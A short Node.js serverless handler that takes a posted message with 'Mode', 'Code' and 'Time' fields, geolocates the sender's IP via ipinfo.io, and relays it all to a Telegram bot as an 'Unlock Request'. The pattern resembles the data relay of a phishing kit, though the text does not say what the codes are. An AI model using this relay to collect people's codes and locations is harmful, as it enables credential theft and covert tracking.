import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST requests allowed" });
  }

  const { message } = req.body;
  if (!message || typeof message !== "string") {
    return res.status(400).json({ error: "Invalid or missing message" });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const ipinfoToken = process.env.IPINFO_TOKEN; // Optional but recommended

  if (!token || !chatId) {
    return res.status(500).json({ error: "Missing Telegram token or chat ID" });
  }

  // 🌐 Get client IP (works on Vercel, Railway, etc.)
  const forwarded = req.headers["x-forwarded-for"];
  const clientIp = forwarded ? forwarded.split(",")[0] : req.socket?.remoteAddress || "unknown";

  // 📍 Fetch IP location info
  let geo = {};
  try {
    const ipinfoURL = ipinfoToken
      ? `https://ipinfo.io/${clientIp}?token=${ipinfoToken}`
      : `https://ipinfo.io/${clientIp}/json`;

    const geoRes = await fetch(ipinfoURL);
    geo = await geoRes.json();
  } catch (err) {
    console.warn("IP lookup failed:", err);
    geo = {};
  }

  // 📦 Build final Telegram message
  const finalMessage = `
🔓 <b>Unlock Request</b>
<b>Mode:</b> ${extractLine(message, "Mode")}
<b>Code:</b> ${extractLine(message, "Code")}
<b>Time:</b> ${extractLine(message, "Time")}
<b>IP:</b> <a href="https://ipinfo.io/${clientIp}">${clientIp}</a>

<b>Location:</b> ${geo.city || "?"}, ${geo.region || "?"}, ${geo.country || "?"}
<b>ISP:</b> ${geo.org || "?"}
<b>Coords:</b> ${geo.loc || "?"}
<b>Timezone:</b> ${geo.timezone || "?"}
`.trim();

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: finalMessage,
        parse_mode: "HTML"
      })
    });

    const result = await response.json();
    if (!result.ok) {
      return res.status(500).json({ error: result.description || "Telegram error" });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("Telegram send error:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
}

// 🔎 Utility to extract a line like "Mode: X" from the input message
function extractLine(text, label) {
  const match = text.match(new RegExp(`${label}:\\s*(.+)`, "i"));
  return match ? match[1].trim() : "?";
}